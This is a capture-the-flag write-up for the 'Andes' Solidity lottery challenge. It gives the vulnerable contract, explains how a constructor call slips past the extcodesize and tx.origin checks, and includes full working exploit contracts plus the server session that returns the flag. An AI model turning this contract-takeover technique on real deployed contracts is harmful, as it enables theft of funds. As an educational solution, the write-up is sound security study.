# Andes
For this challenge we were given the following Solidity contract code:

```js
pragma solidity ^0.7.6;


contract Andes {
    // designators can designate an address to be the next random
    // number selector
    mapping (address => bool) designators;
    mapping (address => uint) balances;

    address selector;
    uint8 private nextVal;
    address[8][8] bids;

    event Registered(address, uint);
    event RoundFinished(address);
    event GetFlag(bytes32);

    constructor(){
        designators[msg.sender] = true;
        _resetBids();
    }

    modifier onlyDesignators() {
        require(designators[msg.sender] == true, "Not owner");
        _;
    }

    function register() public {
        require(balances[msg.sender] < 10);
        
        balances[msg.sender] = 50;

        emit Registered(msg.sender, 50);
    }

    function setNextSelector(address _selector) public onlyDesignators {
        require(_selector != msg.sender);
        selector = _selector;
    }

    function setNextNumber(uint8 value) public {
        require(selector == msg.sender);
        
        nextVal = value;
    }

    function _resetBids() private {
        for (uint i = 0; i < 8; i++) {
            for (uint j = 0; j < 8; j++) {
                bids[i][j] = address(0);
            }
        }
    }

    function purchaseBid(uint8 bid) public {
        require(balances[msg.sender] > 10);
        require(msg.sender != selector);

        uint row = bid % 8;
        uint col = bid / 8;

        if (bids[row][col] == address(0)) {
            balances[msg.sender] -= 10;
            bids[row][col] = msg.sender;
        }
    }

    function playRound() public onlyDesignators {
        address winner = bids[nextVal % 8][nextVal / 8];

        balances[winner] += 1000;
        _resetBids();

        emit RoundFinished(winner);
    }

    function getFlag(bytes32 token) public {
        require(balances[msg.sender] >= 1000);

        emit GetFlag(token);
    }

    function _canBeDesignator(address _addr) private view returns(bool) {
        uint size = 0;

        assembly {
            size := extcodesize(_addr)
        }

        return size == 0 && tx.origin != msg.sender;
    }

    function designateOwner() public {
        require(_canBeDesignator(msg.sender));
        require(balances[msg.sender] > 0);
        
        designators[msg.sender] = true;
    }

    function getBalance() public view returns(uint) {
        return balances[msg.sender];
    }
}
```

Okay, this contract is kind of complicated so let's start from our end goal - we want to be able to call the 
getFlag() function and in order to do that the sender must have a balance of 1000. I'm going to call this sender the bettor
as we will need multiple contracts to complete this challenge. 
We can win 1000 from winning the lottery game as we can see in the playRound() function. 
To enter the lottery our bettor must register() and not be the selector as we can see in the purchaseBid() function.
Okay so what does the selector do? The selector can choose the number that comes up in the lottery with the 
setNextNumber() function. Easy enough to see how that will be abused! How is the selector... selected?
The selector is selected by the setNextSelector() function which can only be called by designators as we can see from 
the onlyDesignators modifier on that function.
Designators are designated by the designateOwner() function but first they must pass two checks in the _canBeDesignator() function.

The first check is that extcodesize(designator_address) must be zero. What this means is that the designator address must 
have no code associated with it, it can't be a smart contract. However this check is bypassable. If we call the designateOwner() function inside our constructor function then the address will not yet have any code associated with it and this check will be bypassed.

The second check is that tx.origin must not be the same as msg.sender. This means that we must use a smart contract, the 
tx.origin is the address that triggers a transaction while the msg.sender is the address that called this contract and these must not be the same to get past this.
This is here to force us to use the bypass I just mentioned and stop people from trying to attack the contract manually from a non smart contract address.
Doing it manually would have significant difficulties anyway because you would need to select a selector in one transaction and trigger the rest of the attack in another transaction (selecting number, placing bet) and then call the playROund() function in yet another transaction, all without someone else interacting with the contract inbetween.

Here is the contract code I made to exploit all this:
```js
pragma solidity ^0.7.6;

interface IAndes {
    function register() external;
    function setNextSelector(address _selector) external;
    function setNextNumber(uint8 value) external;
    function purchaseBid(uint8 bid) external;
    function playRound() external;
    function getFlag(bytes32 token) external;
    function designateOwner() external;
}
interface ISelector {
    function setNextNumber(IAndes target, uint8 number) external;
}

interface IBidder {
    function register(IAndes target) external;
    function purchaseBid(IAndes target, uint8 myLuckyNumber) external;
    function getFlag(IAndes target, bytes32 token) external;
}

contract Designator {
    IAndes target;

    constructor(address _target) {
        target = IAndes(_target);
        target.register();
        target.designateOwner();
    }
    
    // this is all the steps in one function
    function attack(address _selector,address _bidder,bytes32 token, uint8 myLuckyNumber) public {
        ISelector selector = ISelector(_selector);
        IBidder bidder = IBidder(_bidder);
        target.setNextSelector(_selector);
        selector.setNextNumber(target, myLuckyNumber);
        bidder.register(target);
        bidder.purchaseBid(target, myLuckyNumber);
        target.playRound();
        bidder.getFlag(target, token);
    }
}

contract Selector {
    function setNextNumber(IAndes target, uint8 number) public {
        target.setNextNumber(number);
    }
}

contract Bidder {
    function register(IAndes target) public {
        target.register();
    }
    
    function purchaseBid(IAndes target, uint8 myLuckyNumber) public {
        target.purchaseBid(myLuckyNumber);
    }
    
    function getFlag(IAndes target, bytes32 token) public {
        target.getFlag(token);
    }   
}
```

First we deploy the 3 contracts, we must give the Andes address in the contructor of the Designator contract.
Then we call the attack function on our designator contract with the addresses of our other contracts and the flag we want to be emitted.
And voila: https://goerli.etherscan.io/tx/0xd8c609a47b32a527572dd9d76b787bab9cea20da7a116b3e71857409cc57346c#eventlog
```
nc -v nile.chall.pwnoh.io 13378
Connection to nile.chall.pwnoh.io (3.132.58.34) 13378 port [tcp/*] succeeded!
Hello! The contract is running at 0xdCAeeeB6b02A2E5FbAe956200f1b88784bE25500 on the Goerli Testnet.
Here is your token id: 0x8b89f316870288c576123f7fb2034952
Are you ready to receive your flag? (y/n)
y
Here is the flag: buckeye{n3v3r_g4mbl1ng_4g41n}
```
